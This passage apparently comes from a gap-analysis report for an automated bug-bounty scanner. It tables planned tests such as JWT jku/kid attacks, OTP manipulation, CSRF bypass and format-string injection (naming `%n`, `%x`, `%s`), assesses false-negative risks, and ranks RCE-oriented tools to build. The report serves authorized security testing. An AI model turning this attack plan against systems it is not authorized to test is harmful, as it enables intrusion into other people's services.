| 7 | JWT jku/kid Attacks | SESS-05 | HIGH | $200–$3,000 | ~200 | validation_executor | Extend jwt_security_tools.py |
| 8 | Password Reset Token Testing | ATHN-06 | HIGH | $500–$10,000 | ~200 | auth_agent | Host header + token predictability |
| 9 | OTP Response Manipulation | ATHN-09 (gap) | HIGH | $200–$3,000 | ~100 | auth_agent | Extend otp_bypass_test |
| 10 | Azure/GCP Storage Enum | CONF-11 (gap) | MEDIUM | $100–$2,000 | ~200 | scope_discovery_agent | Extend s3_bucket_tools.py |
| 11 | Clickjacking | CLIENT-07 | MEDIUM | $100–$1,000 | ~120 | http_analyst | X-Frame-Options / CSP check |
| 12 | GraphQL Subscriptions | API-06 | MEDIUM | $200–$2,000 | ~250 | fuzzing_agent | WS upgrade + auth test |
| 13 | CSRF Token Bypass | SESS-04 | MEDIUM | $100–$2,000 | ~200 | auth_agent | Token extraction + bypass |
| 14 | HSTS Header Check | CONF-07 | LOW | $50–$500 | ~80 | http_analyst | Header parse |
| 15 | SMTP/IMAP Injection | INPV-15 | MEDIUM | $100–$2,000 | ~200 | validation_executor | Email field injection |
| 16 | Weak Lockout Testing | ATHN-03 | MEDIUM | $100–$1,000 | ~150 | auth_agent | Brute-force threshold test |
| 17 | Session Token Randomness | SESS-03 | MEDIUM | $100–$1,000 | ~150 | auth_agent | Entropy analysis |
| 18 | Format String Injection | INPV-14 | HIGH | $200–$3,000 | ~100 | validation_executor | `%n`, `%x`, `%s` in user-controlled strings |
| 19 | CSS Injection | CLIENT-05 | LOW | $50–$500 | ~80 | http_analyst | Style tag injection |
| 20 | Dangling DNS Active Check | CONF-10 (gap) | HIGH | $100–$2,000 | ~100 | scope_discovery_agent | CNAME resolution check |

---

## Part V — False Negative Risk Assessment

Areas where **scanner misses = human must cover**:

1. **Logic flaws** (BUSL-01): No tool can fully cover business logic flaws. The `multi_step_flow_test` handles flow state machines but cannot detect pricing errors or inventory manipulation. **Likely false negatives in: e-commerce, fintech, gaming.**

2. **Auth race conditions** (BUSL-04): `race_condition_test` uses 10 threads but may miss subtle time-of-check-time-of-use (TOCTOU) in financial operations. **Likely false negatives in: banking, trading platforms.**

3. **Chained attacks** (e.g., XSS → CSRF → IDOR → data exfil): The `exploit_chain_correlator` has 10 hardcoded chains. Any novel chain will be missed. **Recommend:** Add chain discovery based on finding confidence scores and cross-category interactions.

4. **API versioning attacks** (e.g., `/v1/admin` accessible without auth): `autorize_multi_role` checks known roles but cannot enumerate all API versions. **Likely false negatives in: APIs with versioned namespaces.**

5. **SSRF to internal RDP/VNC** (not just metadata): `ssrf_metadata_enum` checks AWS/GCP/Azure metadata endpoints but misses internal network scanning for RDP/VNC/SMB. **Likely false negatives in: internal-facing apps with SSRF.**

6. **GraphQL field cost DoS**: Introspection reveals schema, but no tool measures query complexity or depth-cost before sending. An attacker can send deeply nested queries that cause CPU spin on the server. **Likely false negatives in: GraphQL APIs with complex data models.**

---

## Summary: Top 5 Most Impactful Additions

For maximum finding coverage with minimum effort:

| Rank | Addition | Why | Est. Time |
|------|---------|-----|----------|
| **1** | File Upload RCE Tool | RCE path, highest CVSS impact | 1 day |
| **2** | SSTI Dedicated Tool | RCE path, common in Python apps | 1 day |
| **3** | Subdomain Takeover | P1 on most programs, easy to confirm | 4 hours |
| **4** | MFA Bypass Suite | High-value auth finding class | 4 hours |
| **5** | Deserialization Tool | RCE path, rarely caught by scanner | 1 day |

These 5 additions close the most common high-severity false negative categories across Bugcrowd/HackerOne top-50 findings.

---

*Report generated: 2026-05-02*
*Gap analysis: WSTG v4.2 + OWASP Top 10 2021 + Bugcrowd Top 10 + HackerOne Top 10*